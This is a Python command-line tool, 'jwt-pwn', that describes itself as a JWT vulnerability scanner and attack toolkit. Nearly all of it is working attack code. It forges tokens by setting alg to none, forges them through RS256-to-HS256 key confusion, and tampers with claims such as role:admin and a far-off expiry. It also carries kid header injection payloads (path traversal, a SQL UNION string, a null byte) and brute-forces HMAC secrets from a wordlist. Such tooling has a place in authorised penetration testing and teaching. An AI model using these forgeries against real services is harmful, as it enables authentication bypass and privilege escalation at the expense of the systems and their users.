#!/usr/bin/env python3
"""
jwt-pwn — JWT vulnerability scanner and attack toolkit

Detects and exploits common JWT vulnerabilities:
  - alg:none attack (CVE class: signature bypass)
  - RS256→HS256 algorithm confusion attack
  - Weak HMAC secret brute-force (wordlist)
  - Claim tampering (exp, iat, sub, role, admin, iss)
  - Kid injection (path traversal, SQL injection payloads)
"""

import base64
import hashlib
import hmac
import json
import sys
import argparse
import time
from typing import Optional


# ─── Base64url helpers ────────────────────────────────────────────────────────

def b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def b64url_encode(b: bytes) -> str:
    return base64.b64encode(b).decode().replace("+", "-").replace("/", "_").rstrip("=")


# ─── JWT decode ───────────────────────────────────────────────────────────────

def decode_jwt(token: str) -> tuple[dict, dict, bytes]:
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError(f"Expected 3 JWT parts, got {len(parts)}")
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig     = b64url_decode(parts[2])
    return header, payload, sig


def encode_jwt(header: dict, payload: dict, secret: Optional[str] = None) -> str:
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()

    alg = header.get("alg", "none").upper()
    if alg == "NONE" or secret is None:
        return f"{h}.{p}."

    hmac_algos = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    if alg not in hmac_algos:
        raise ValueError(f"Cannot sign with alg={alg} (only HS256/384/512 or none)")

    sig = hmac.new(secret.encode(), signing_input, hmac_algos[alg]).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


# ─── Attacks ──────────────────────────────────────────────────────────────────

def attack_alg_none(token: str) -> list[dict]:
    """Strip signature, set alg to none — bypasses signature verification."""
    header, payload, _ = decode_jwt(token)
    results = []
    for alg_val in ("none", "None", "NONE", "nOnE"):
        h = dict(header, alg=alg_val)
        forged = encode_jwt(h, payload)
        results.append({"attack": "alg:none", "alg_value": alg_val, "token": forged})
    return results


def attack_rs256_hs256(token: str, public_key_pem: str) -> dict:
    """
    Algorithm confusion: sign with HS256 using the RSA public key as the HMAC secret.
    Vulnerable servers accepting RS256 may verify HS256 tokens using the public key.
    """
    header, payload, _ = decode_jwt(token)
    h = dict(header, alg="HS256")
    secret = public_key_pem.strip()
    forged = encode_jwt(h, payload, secret=secret)
    return {"attack": "RS256→HS256 confusion", "token": forged}


def attack_claim_tamper(token: str, secret: Optional[str], patches: dict) -> dict:
    """Modify payload claims and re-sign (or unsign if no secret)."""
    header, payload, _ = decode_jwt(token)
    payload.update(patches)
    if "exp" in patches and patches["exp"] == "+9999d":
        payload["exp"] = int(time.time()) + 9999 * 86400
    if "iat" in patches and patches["iat"] == "now":
        payload["iat"] = int(time.time())
    forged = encode_jwt(header, payload, secret=secret)
    return {"attack": "claim_tamper", "patches": patches, "token": forged}


def attack_kid_injection(token: str, secret: Optional[str], payload_type: str) -> dict:
    """
    Inject malicious 'kid' header values:
      - path_traversal: load /dev/null as key → empty HMAC secret
      - sql_injection: classic SQLi in kid field
    """
    header, payload, _ = decode_jwt(token)
    payloads = {
        "path_traversal": "../../../../dev/null",
        "sql_injection":  "' UNION SELECT 'attacker_key' -- -",
        "null_byte":      "key\x00.pem",
    }
    kid_val = payloads.get(payload_type, payload_type)
    h = dict(header, kid=kid_val)
    # For path_traversal: /dev/null → empty key → sign with empty secret
    if payload_type == "path_traversal":
        secret = ""
    forged = encode_jwt(h, payload, secret=secret)
    return {"attack": f"kid_injection:{payload_type}", "kid": kid_val, "token": forged}


def brute_hmac(token: str, wordlist_path: str) -> Optional[dict]:
    """Try wordlist to recover HMAC secret."""
    header, payload, sig = decode_jwt(token)
    alg = header.get("alg", "").upper()
    hmac_algos = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    if alg not in hmac_algos:
        print(f"[!] alg={alg} is not HMAC-based — brute force not applicable")
        return None

    parts = token.strip().split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    hash_fn = hmac_algos[alg]

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as fh:
            for i, line in enumerate(fh):
                candidate = line.strip()
                if not candidate:
                    continue
                test_sig = hmac.new(candidate.encode(), signing_input, hash_fn).digest()
                if hmac.compare_digest(test_sig, sig):
                    return {"attack": "brute_force", "secret": candidate, "line": i + 1}
                if i % 100000 == 0 and i > 0:
                    print(f"  [brute] {i:,} candidates tried...", file=sys.stderr)
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist_path}", file=sys.stderr)
    return None


# ─── Output helpers ───────────────────────────────────────────────────────────

def print_decoded(token: str) -> None:
    header, payload, sig = decode_jwt(token)
    print("\n── Header ──────────────────────────────")
    print(json.dumps(header, indent=2))
    print("── Payload ─────────────────────────────")
    print(json.dumps(payload, indent=2))
    now = int(time.time())
    if "exp" in payload:
        delta = payload["exp"] - now
        if delta < 0:
            print(f"  ⚠ EXPIRED {-delta}s ago")
        else:
            print(f"  ✓ expires in {delta}s")
    print(f"── Signature ({len(sig)} bytes) ─────────────")
    print(sig.hex())


# ─── CLI ──────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="JWT vulnerability scanner and attack toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Decode and inspect a JWT
  python jwt_pwn.py --decode eyJ...

  # Try alg:none attack
  python jwt_pwn.py --token eyJ... --alg-none

  # RS256→HS256 confusion with public key file
  python jwt_pwn.py --token eyJ... --rs256-hs256 pubkey.pem

  # Tamper claims (re-sign with known secret)
  python jwt_pwn.py --token eyJ... --tamper '{"role":"admin","exp":"+9999d"}' --secret mysecret

  # kid path traversal (sign with empty string)
  python jwt_pwn.py --token eyJ... --kid path_traversal

  # Brute-force HMAC secret
  python jwt_pwn.py --token eyJ... --brute /usr/share/wordlists/rockyou.txt
""",
    )
    parser.add_argument("--token", metavar="JWT")
    parser.add_argument("--decode", metavar="JWT", help="Decode and print JWT fields")
    parser.add_argument("--alg-none", action="store_true", help="alg:none signature bypass")
    parser.add_argument("--rs256-hs256", metavar="PUBKEY_PEM", help="RS256→HS256 confusion attack")
    parser.add_argument("--tamper", metavar="JSON", help='Claim patches as JSON e.g. \'{"role":"admin"}\'')
    parser.add_argument("--secret", metavar="SECRET", help="HMAC secret for re-signing")
    parser.add_argument("--kid", metavar="TYPE",
                        choices=["path_traversal", "sql_injection", "null_byte"],
                        help="kid header injection type")
    parser.add_argument("--brute", metavar="WORDLIST", help="Brute-force HMAC secret from wordlist")
    parser.add_argument("--json", action="store_true", dest="json_out", help="Output results as JSON")
    args = parser.parse_args()

    if args.decode:
        print_decoded(args.decode)
        return

    if not args.token:
        parser.print_help()
        sys.exit(0)

    results = []

    if args.alg_none:
        results.extend(attack_alg_none(args.token))

    if args.rs256_hs256:
        with open(args.rs256_hs256) as f:
            pem = f.read()
        results.append(attack_rs256_hs256(args.token, pem))

    if args.tamper:
        patches = json.loads(args.tamper)
        results.append(attack_claim_tamper(args.token, args.secret, patches))

    if args.kid:
        results.append(attack_kid_injection(args.token, args.secret, args.kid))

    if args.brute:
        print(f"[*] Brute-forcing {args.brute} ...", file=sys.stderr)
        found = brute_hmac(args.token, args.brute)
        if found:
            results.append(found)
        else:
            print("[!] Secret not found in wordlist", file=sys.stderr)

    if not results:
        print_decoded(args.token)
        return

    if args.json_out:
        print(json.dumps(results, indent=2))
    else:
        for r in results:
            print(f"\n[+] {r.get('attack')}")
            for k, v in r.items():
                if k != "attack":
                    print(f"    {k}: {v}")


if __name__ == "__main__":
    main()
